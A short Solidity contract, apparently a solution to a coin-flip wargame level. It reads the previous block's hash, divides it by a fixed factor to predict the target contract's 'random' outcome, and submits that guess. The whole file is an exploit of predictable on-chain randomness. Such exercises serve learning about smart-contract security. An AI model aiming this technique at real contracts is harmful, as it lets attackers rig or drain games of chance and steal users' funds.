pragma solidity 0.8.7;


interface ICoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract level3 {

    ICoinFlip public surface;

    uint256 public consecutiveWins;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(){
        surface = ICoinFlip(0x96E35B7e384D933450272F1C7b34a169B0763b1C);
    }


    function win() external payable {
        uint256 blockValue = uint256(blockhash(block.number -1));

        
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        surface.flip(side);
    }

        receive() external payable {}
    }
